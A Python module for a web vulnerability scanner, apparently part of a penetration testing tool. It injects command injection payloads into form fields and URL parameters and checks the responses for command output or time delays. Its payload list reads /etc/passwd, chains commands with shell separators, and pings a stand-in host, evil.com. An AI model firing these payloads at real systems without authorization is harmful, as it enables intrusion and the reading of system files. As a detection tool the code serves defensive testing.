#!/usr/bin/env python3

import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style

class CommandInjectionScanner:
    """Scanner for detecting command injection vulnerabilities"""
    
    def __init__(self, scanner_instance):
        """
        Initialize the Command Injection Scanner with a reference to the main scanner instance
        
        Args:
            scanner_instance: The main WebScanner instance
        """
        self.scanner = scanner_instance
        self.target_url = scanner_instance.target_url
        self.session = scanner_instance.session
        self.timeout = scanner_instance.timeout
        self.verbose = scanner_instance.verbose
        self.max_threads = scanner_instance.max_threads
        self.vulnerabilities = scanner_instance.vulnerabilities
        self.forms = scanner_instance.forms
        self.discovered_urls = scanner_instance.discovered_urls
        
        # Command injection payloads with platform-specific commands
        self.cmd_payloads = [
            # Linux payloads
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            ";cat /etc/passwd;",
            "| cat /etc/passwd",
            "|| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "%0acat /etc/passwd",
            
            # Windows payloads
            "& dir",
            "&& dir",
            "| dir",
            "; dir",
            "%0adir",
            
            # Blind command injection payloads
            "$(sleep 5)",
            "`sleep 5`",
            "; sleep 5;",
            "& sleep 5",
            "&& sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "%0asleep 5",
            
            # Ping back payloads (would need listener in real scenario)
            "$(ping -c 3 evil.com)",
            "`ping -c 3 evil.com`",
            "& ping -c 3 evil.com",
            "| ping -c 3 evil.com"
        ]
        
        # Command injection indicators in response
        self.cmd_indicators = [
            "root:",
            "bin:",
            "daemon:",
            "Directory of",
            "Volume Serial Number",
            "directory listing",
            "Directory listing",
            "<DIR>",
            "Volume in drive",
            "VAR=",
            "PATH=",
            "HOME=",
            "PWD=",
            "sh: command"
        ]
    
    def test_form(self, form):
        """
        Test a single form for command injection vulnerabilities
        
        Args:
            form (dict): Form data containing action, method, and inputs
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        for input_field in form.get('inputs', []):
            # Skip fields that are unlikely to be vulnerable (checkbox, radio, etc.)
            if input_field.get('type') in ['checkbox', 'radio', 'file', 'image']:
                continue
                
            # Test potentially vulnerable fields
            for payload in self.cmd_payloads:
                data = {}
                
                # Fill form fields
                for field in form.get('inputs', []):
                    if field.get('name') == input_field.get('name'):
                        data[field.get('name')] = payload
                    elif field.get('type') == 'email':
                        data[field.get('name')] = 'test@example.com'
                    elif field.get('type') == 'password':
                        data[field.get('name')] = 'Password123!'
                    else:
                        data[field.get('name')] = 'test'
                
                try:
                    start_time = time.time()
                    
                    if form.get('method', '').upper() == 'GET':
                        response = self.session.get(form.get('action', form['url']), params=data, timeout=self.timeout)
                    else:
                        response = self.session.post(form.get('action', form['url']), data=data, timeout=self.timeout)
                        
                    end_time = time.time()
                    response_time = end_time - start_time
                    
                    # Check for command execution indicators in response
                    for indicator in self.cmd_indicators:
                        if indicator in response.text:
                            vulnerability = {
                                'type': 'Command Injection',
                                'url': form['url'],
                                'form_action': form.get('action', ''),
                                'method': form.get('method', ''),
                                'field': input_field.get('name'),
                                'payload': payload,
                                'indicator': indicator,
                                'severity': 'Critical',
                                'evidence': f"Response contains command injection indicator: '{indicator}'"
                            }
                            vulnerabilities.append(vulnerability)
                            self.vulnerabilities.append(vulnerability)
                            
                            if self.verbose:
                                print(Fore.RED + f"[!] Potential command injection found at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                            return vulnerabilities
                    
                    # Check for time delay in blind injection payloads
                    if "sleep 5" in payload and response_time > 4.5:
                        vulnerability = {
                            'type': 'Command Injection',
                            'url': form['url'],
                            'form_action': form.get('action', ''),
                            'method': form.get('method', ''),
                            'field': input_field.get('name'),
                            'payload': payload,
                            'indicator': f"Time delay ({response_time:.2f}s)",
                            'severity': 'Critical',
                            'evidence': f"Potential blind command injection: response time was {response_time:.2f}s with a sleep command"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential blind command injection at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Response time: {response_time:.2f}s" + Style.RESET_ALL)
                        
                except requests.exceptions.Timeout:
                    # Timeout might indicate a successful blind injection
                    if "sleep" in payload:
                        vulnerability = {
                            'type': 'Command Injection',
                            'url': form['url'],
                            'form_action': form.get('action', ''),
                            'method': form.get('method', ''),
                            'field': input_field.get('name'),
                            'payload': payload,
                            'indicator': "Request timeout",
                            'severity': 'Critical',
                            'evidence': "Potential blind command injection: request timed out with a sleep command"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential blind command injection at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: Request timed out" + Style.RESET_ALL)
                        return vulnerabilities
                except Exception as e:
                    if self.verbose:
                        print(Fore.YELLOW + f"  [!] Error testing {form['url']}: {str(e)}" + Style.RESET_ALL)
                    continue
        
        return vulnerabilities
    
    def test_url_parameter(self, url):
        """
        Test URL parameters for command injection vulnerabilities
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return []
            
        for param_name, param_value in query_params.items():
            # Skip parameters that are unlikely to be vulnerable
            if len(param_value[0]) == 0:
                continue
                
            # Prioritize parameters that might be used for system operations
            risky_params = ['cmd', 'exec', 'eval', 'command', 'cmd', 'script', 'function', 'run', 'template']
            is_risky = any(risk in param_name.lower() for risk in risky_params)
            
            # Test a subset of payloads
            payloads_to_test = self.cmd_payloads if is_risky else self.cmd_payloads[:7]  # Use full list for risky params
            
            for payload in payloads_to_test:
                new_params = query_params.copy()
                new_params[param_name] = [payload]
                
                query = urllib.parse.urlencode(new_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query,
                    parsed_url.fragment
                ))
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    end_time = time.time()
                    response_time = end_time - start_time
                    
                    # Check for command execution indicators
                    for indicator in self.cmd_indicators:
                        if indicator in response.text:
                            vulnerability = {
                                'type': 'Command Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'indicator': indicator,
                                'severity': 'Critical',
                                'evidence': f"Response contains command injection indicator: '{indicator}'"
                            }
                            vulnerabilities.append(vulnerability)
                            self.vulnerabilities.append(vulnerability)
                            
                            if self.verbose:
                                print(Fore.RED + f"[!] Command injection found in URL parameter at {url}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Parameter: {param_name}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {indicator}" + Style.RESET_ALL)
                            return vulnerabilities
                    
                    # Check for time delay in blind injection payloads
                    if "sleep 5" in payload and response_time > 4.5:
                        vulnerability = {
                            'type': 'Command Injection',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'indicator': f"Time delay ({response_time:.2f}s)",
                            'severity': 'Critical',
                            'evidence': f"Potential blind command injection: response time was {response_time:.2f}s with a sleep command"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential blind command injection in URL parameter at {url}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Parameter: {param_name}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Response time: {response_time:.2f}s" + Style.RESET_ALL)
                            
                except requests.exceptions.Timeout:
                    # Timeout might indicate a successful blind injection
                    if "sleep" in payload:
                        vulnerability = {
                            'type': 'Command Injection',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'indicator': "Request timeout",
                            'severity': 'Critical',
                            'evidence': "Potential blind command injection: request timed out with a sleep command"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential blind command injection in URL parameter at {url}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Parameter: {param_name}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: Request timed out" + Style.RESET_ALL)
                        return vulnerabilities
                except Exception as e:
                    if self.verbose:
                        print(Fore.YELLOW + f"  [!] Error testing {url}: {str(e)}" + Style.RESET_ALL)
                    continue
        
        return vulnerabilities
    
    def run(self):
        """
        Test for command injection vulnerabilities in forms and URL parameters
        
        Returns:
            int: Number of command injection vulnerabilities found
        """
        cmd_injection_count = sum(1 for v in self.vulnerabilities if v.get('type') == 'Command Injection')
        
        if self.verbose:
            print(Fore.BLUE + "[*] Testing for command injection vulnerabilities..." + Style.RESET_ALL)
        
        # Test forms for command injection
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(self.test_form, self.forms))
        
        # Test URL parameters for command injection
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            url_results = list(executor.map(self.test_url_parameter, self.discovered_urls))
        
        # Count how many command injection vulnerabilities were found
        cmd_vulnerabilities = sum(1 for v in self.vulnerabilities if v.get('type') == 'Command Injection')
        cmd_vulnerabilities_found = cmd_vulnerabilities - cmd_injection_count
        
        print(Fore.GREEN + f"[+] Completed command injection testing, found {cmd_vulnerabilities_found} vulnerabilities" + Style.RESET_ALL)
        return cmd_vulnerabilities_found 